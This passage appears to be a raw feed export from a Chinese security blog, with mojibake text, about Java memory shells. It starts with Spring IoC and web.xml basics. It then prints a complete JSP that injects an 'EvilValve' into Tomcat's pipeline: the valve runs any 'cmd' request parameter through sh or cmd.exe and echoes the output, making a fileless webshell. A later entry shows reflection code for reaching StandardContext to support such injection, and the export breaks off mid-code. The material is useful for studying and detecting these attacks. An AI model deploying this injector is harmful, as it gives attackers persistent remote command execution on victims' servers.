class="hljs-string">&quot;applicationContext.xml&quot;</span>);<span class="hljs-comment">//åŠ è½½é…ç½®æ–‡ä»¶</span><br>       <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) applicationContext.getBean(<span class="hljs-string">&quot;per&quot;</span>);<span class="hljs-comment">//å®ä¾‹åŒ–å¯¹è±¡</span><br>        System.out.println(person);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br><br>       <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;per&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;Person&quot;</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;xsw6a&quot;</span> /&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;20&quot;</span> /&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204192243722.png" alt="QQæˆªå›¾20220419112540"></p><h2 id="æ³¨é‡Šè‡ªåŠ¨è£…è½½bean"><a href="#æ³¨é‡Šè‡ªåŠ¨è£…è½½bean" class="headerlink" title="æ³¨é‡Šè‡ªåŠ¨è£…è½½bean"></a>æ³¨é‡Šè‡ªåŠ¨è£…è½½bean</h2><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- é…ç½®ç›¸å…³çš„context.xsd--&gt;</span><br><br>            <span class="hljs-tag">&lt;<span class="hljs-name">context:annotation-config</span>/&gt;</span> <span class="hljs-comment">&lt;!-- å£°æ˜æ³¨è§£é…ç½® --&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">context:component-scan</span> <span class="hljs-attr">base-package</span>=<span class="hljs-string">&quot;com&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><span class="hljs-comment">&lt;!-- å£°æ˜Springå·¥å‚æ³¨è§£çš„æ‰«æèŒƒå›´ --&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥å®ç°ç±»å®ä¾‹åŒ–ã€‚</p><p>è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹IoCæ˜¯å¦‚ä½•å®ç°çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204192228094.png" alt="QQæˆªå›¾20220419222812"></p><p>è·Ÿè¿›å¯ä»¥å‘ç°getBeançš„å®ç°æ˜¯åœ¨BeanFactoryæ¥å£ä¸‹çš„getBeanæ–¹æ³•ã€‚</p><h2 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204192243181.png" alt="QQæˆªå›¾20220419222635"></p><p>æ‰€ä»¥å¯ä»¥é€šè¿‡å…¶æ¥åˆ›å»ºIoCå®¹å™¨ã€‚<br>BeanFactoryå’ŒApplicationContextçš„åŒºåˆ«åœ¨äº: BeanFactoryçš„å®ç°æ˜¯æŒ‰éœ€åˆ›å»ºï¼Œå³ç¬¬ä¸€æ¬¡è·å–Beanæ—¶æ‰åˆ›å»ºè¿™ä¸ªBeanï¼Œè€ŒApplicationContextä¼šä¸€æ¬¡æ€§åˆ›å»ºæ‰€æœ‰çš„Bean</p><h2 id="ContextLoaderListener-ä¸-DispatcherServlet"><a href="#ContextLoaderListener-ä¸-DispatcherServlet" class="headerlink" title="ContextLoaderListener ä¸ DispatcherServlet"></a>ContextLoaderListener ä¸ DispatcherServlet</h2><p><a href="https://xz.aliyun.com/t/10781">https://xz.aliyun.com/t/10781</a></p><p><strong>ContextLoaderListener</strong> ï¼š ä¸»è¦è¢«ç”¨æ¥åˆå§‹åŒ–å…¨å±€å”¯ä¸€çš„Root Contextï¼Œå³Root WebApplicationContextã€‚è¿™ä¸ªRoot WebApplicationContextä¼šå’Œå…¶ä»–Child Contextå®ä¾‹å…±äº«å®ƒçš„IoCå®¹å™¨ï¼Œä¾›å…¶ä»–Child Contextè·å–å¹¶ä½¿ç”¨å®¹å™¨ä¸­çš„beanã€‚</p><p>**DispatcherServlet **ï¼šæœ¬è´¨ä¸Šæ¥è®²æ˜¯ä¸€ä¸ª Servletï¼ˆå®ƒç»§æ‰¿è‡ªHttpServletï¼‰ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯å¤„ç†ä¼ å…¥çš„webè¯·æ±‚ï¼Œæ ¹æ®é…ç½®çš„URL patternï¼Œå°†è¯·æ±‚åˆ†å‘ç»™æ­£ç¡®çš„Controllerå’ŒViewã€‚DispatcherServletåˆå§‹åŒ–å®Œæˆåï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ™®é€šçš„Child Contextå®ä¾‹ã€‚</p><p>è¿™é‡Œé™„ä¸Šä¸€ä¸ªå…¸å‹çš„é…ç½®æ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/xml/ns/javaee&gt;&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.5&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>HelloSpringMVC<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>contextConfigLocation<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>/WEB-INF/dispatcherServlet-servlet.xml<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dispatcherServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…å­˜é©¬ï¼šValveå‹</title>
    <link href="/2022/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AValve%E5%9E%8B/"/>
    <url>/2022/04/18/%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%9AValve%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-å†…å­˜é©¬ï¼šValveå‹"><a href="#Tomcat-å†…å­˜é©¬ï¼šValveå‹" class="headerlink" title="Tomcat å†…å­˜é©¬ï¼šValveå‹"></a>Tomcat å†…å­˜é©¬ï¼šValveå‹</h1><p>åœ¨é˜…è¯»<a href="https://su18.org/post/memory-shell/#tomcat-valve-%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%90%8E%E3%80%82">https://su18.org/post/memory-shell/#tomcat-valve-%E5%86%85%E5%AD%98%E9%A9%ACä¹‹åã€‚</a><br>å®ç°Valueå†…å­˜é©¬çš„å…³é”®åœ¨äºè·å–Pipeline å®ä¾‹ï¼ˆStandardPipelineï¼‰ã€‚<br>Tomcat ä¸­ Pipeline ä»…æœ‰ä¸€ä¸ªå®ç° StandardPipelineï¼Œå­˜æ”¾åœ¨ ContainerBase çš„ pipeline å±æ€§ä¸­ï¼Œå¹¶ä¸” ContainerBase æä¾› <code>addValve</code> æ–¹æ³•è°ƒç”¨ StandardPipeline çš„ addValve æ–¹æ³•æ·»åŠ ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204181237846.png" alt="QQæˆªå›¾20220418122416"></p><p>ä¹Ÿå°±è¯´è¿™é‡Œæœ€ç®€å•çš„ï¼Œå°±æ˜¯è·å–StandardContextValveä¹‹åï¼Œè·å–ä»–çš„Pipelineï¼Œå¹¶ä¸”åƒå…¶ä¸­æ·»åŠ åŒ…å«æ¶æ„ä»£ç çš„Valveã€‚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br><br>&lt;%<br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getSession().getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilValve</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ValveBase</span> &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    isLinux = <span class="hljs-literal">false</span>;<br>                &#125;<br>                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>( in ).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>                out.println(output);<br>                out.flush();<br>                out.close();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            &#125; &#125; &#125;<br>    standardContext.getPipeline().addValve(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilValve</span>());<br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å†…å­˜é©¬</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•è·å–StandardContextå¹¶ä¸”å®Œæˆé€šæ€</title>
    <link href="/2022/04/17/%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96StandardContext%E5%B9%B6%E4%B8%94%E5%AE%8C%E6%88%90%E9%80%9A%E6%9D%80/"/>
    <url>/2022/04/17/%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96StandardContext%E5%B9%B6%E4%B8%94%E5%AE%8C%E6%88%90%E9%80%9A%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="å¦‚ä½•è·å–StandardContextå¹¶ä¸”å®Œæˆé€šæ€"><a href="#å¦‚ä½•è·å–StandardContextå¹¶ä¸”å®Œæˆé€šæ€" class="headerlink" title="å¦‚ä½•è·å–StandardContextå¹¶ä¸”å®Œæˆé€šæ€"></a>å¦‚ä½•è·å–StandardContextå¹¶ä¸”å®Œæˆé€šæ€</h1><ul><li><p>ServerletContextï¼ˆæ˜¯ä¸€ä¸ªæ¥å£ï¼‰</p><p>é€šè¿‡<code>request.getServletContext()</code> è·å–åˆ°çš„æ˜¯ApplicationContextFacadeå¯¹è±¡ï¼Œå®ƒæ˜¯å¯¹ServerletContextæ¥å£çš„å®ç°ç±»ï¼Œè¯¥ç±»æä¾›äº†Webåº”ç”¨æ‰€æœ‰Servletçš„è§†å›¾ï¼Œå¯ä»¥å¯¹æŸä¸ªWebåº”ç”¨çš„å„ç§èµ„æºå’ŒåŠŸèƒ½è¿›è¡Œè®¿é—®ã€‚</p><p>WEBå®¹å™¨åœ¨å¯åŠ¨æ—¶ï¼Œå®ƒä¼šä¸ºæ¯ä¸ªWebåº”ç”¨ç¨‹åºéƒ½åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ServletContextã€‚<strong>å®ƒä»£è¡¨å½“å‰Webåº”ç”¨ï¼Œå¹¶ä¸”å®ƒè¢«æ‰€æœ‰å®¢æˆ·ç«¯å…±äº«</strong>ã€‚</p></li><li><p>ApplicationContext</p><p>ApplicationContextä¹Ÿæ˜¯å¯¹ServerletContextæ¥å£çš„å®ç°ç±»ï¼Œç”±ä¸Šå›¾å¯çŸ¥è¯¥ç±»è¢«åŒ…è£…åœ¨ApplicationContextFacadeç±»ä¸­ã€‚</p></li><li><p>StandardContext</p><p>org.apache.catalina.Contextæ¥å£çš„é»˜è®¤å®ç°ä¸ºStandardContextï¼Œè€ŒContextåœ¨Tomcatä¸­ä»£è¡¨ä¸€ä¸ªwebåº”ç”¨ã€‚ApplicationContextæ‰€å®ç°çš„æ–¹æ³•å…¶å®éƒ½æ˜¯è°ƒç”¨çš„StandardContextä¸­çš„æ–¹æ³•ï¼ŒStandardContextæ˜¯Tomcatä¸­çœŸæ­£èµ·ä½œç”¨çš„Contextã€‚</p></li></ul><p><strong>å‘å„ç§ä¸­é—´ä»¶å’Œæ¡†æ¶æ³¨å…¥å†…å­˜é©¬çš„åŸºç¡€ï¼Œå°±æ˜¯è¦è·å¾—contextï¼Œcontextå®é™…ä¸Šå°±æ˜¯æ‹¥æœ‰å½“å‰ä¸­é—´ä»¶æˆ–æ¡†æ¶å¤„ç†è¯·æ±‚ã€ä¿å­˜å’Œæ§åˆ¶servletå¯¹è±¡ã€ä¿å­˜å’Œæ§åˆ¶filterå¯¹è±¡ç­‰åŠŸèƒ½çš„å¯¹è±¡ã€‚</strong></p><h2 id="åœ¨å·²æœ‰requestå¯¹è±¡çš„æƒ…å†µ"><a href="#åœ¨å·²æœ‰requestå¯¹è±¡çš„æƒ…å†µ" class="headerlink" title="åœ¨å·²æœ‰requestå¯¹è±¡çš„æƒ…å†µ"></a>åœ¨å·²æœ‰requestå¯¹è±¡çš„æƒ…å†µ</h2><p>å¯ä»¥ä»HttpRequestä¸­è·å–ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥å‘Tomcatçš„webappç›®å½•ä¸‹ä¸Šä¼ JSPæ–‡ä»¶çš„æƒ…å†µä¸‹ï¼ŒJSPæ–‡ä»¶é‡Œå¯ä»¥å°±ç›´æ¥è°ƒç”¨requestå¯¹è±¡ï¼Œå› ä¸ºTomcatç¼–ç JSPæ–‡ä»¶ä¸ºjavaæ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨å°†requestå¯¹è±¡æ”¾åŠ è¿›å»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    context.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) context.get(servletContext);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">context1</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    context1.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) context1.get(applicationContext);<br></code></pre></td></tr></table></figure><h2 id="åœ¨æ²¡æœ‰requestå¯¹è±¡çš„æƒ…å†µ"><a href="#åœ¨æ²¡æœ‰requestå¯¹è±¡çš„æƒ…å†µ" class="headerlink" title="åœ¨æ²¡æœ‰requestå¯¹è±¡çš„æƒ…å†µ"></a>åœ¨æ²¡æœ‰requestå¯¹è±¡çš„æƒ…å†µ</h2><h3 id="ä»ContextClassLoaderè·å–"><a href="#ä»ContextClassLoaderè·å–" class="headerlink" title="ä»ContextClassLoaderè·å–"></a>ä»ContextClassLoaderè·å–</h3><p>äº†è§£ä¸€ä¸‹<a href="https://blog.csdn.net/qq_40378034/article/details/119698526">ContextClassLoader</a>ï¼Œ<strong>é™åˆ¶äºTomcat8ã€9</strong>ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>current<span class="hljs-constructor">Thread()</span>.get<span class="hljs-constructor">ContextClassLoader()</span>;<br>StandardContext standardContext = (StandardContext) contextClassLoader.get<span class="hljs-constructor">Resources()</span>.get<span class="hljs-constructor">Context()</span>;<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œæœ‰å¾ˆå¤šæ–‡ç« å¾—åˆ†æTomcat6ã€7ã€8ã€9é€šæ€ã€‚<br><a href="https://www.cnblogs.com/zpchcbd/p/15153518.html">https://www.cnblogs.com/zpchcbd/p/15153518.html</a><br><a href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></p><p>è¿™é‡Œæˆ‘å°±ç†è§£ä¸€ä¸‹è¿™äº›ä»£ç äº†ã€‚<br><strong>åœ¨Tomcatæ¶æ„çš„Containerç»„ä»¶ä¸­ï¼ŒStandardContextç»„ä»¶æ˜¯å­˜åœ¨äºStandardHostå¯¹è±¡ï¼Œè€ŒStandardHostå¯¹è±¡åˆå­˜åœ¨äºStandardEngineå¯¹è±¡ä¸­ï¼Œæ‰€ä»¥å¦‚æœèƒ½è·å¾—StandardEngineæˆ–è€…æ˜¯StandardHostï¼Œé‚£ä¹ˆä¹ŸåŒæ ·å¯ä»¥è·å¾—StandardContext</strong>ã€‚è¿™é‡Œå°±ç›´æ¥è¯´Tomcat9äº†ï¼ŒTomcat9ä¸­é™¤å»äº†ä¹‹å‰ç‰ˆæœ¬ä¸­å¾—StandardEngineçº¿ç¨‹ã€‚ä½†æ˜¯å¯ä»¥ä»åˆ«å¤„è·å–ã€‚<br>è¿™é‡Œå°±åˆ†ä¸¤éƒ¨åˆ†.</p><h4 id="è·å–å¯¹è±¡ä¸­çš„å±æ€§"><a href="#è·å–å¯¹è±¡ä¸­çš„å±æ€§" class="headerlink" title="è·å–å¯¹è±¡ä¸­çš„å±æ€§"></a>è·å–å¯¹è±¡ä¸­çš„å±æ€§</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code 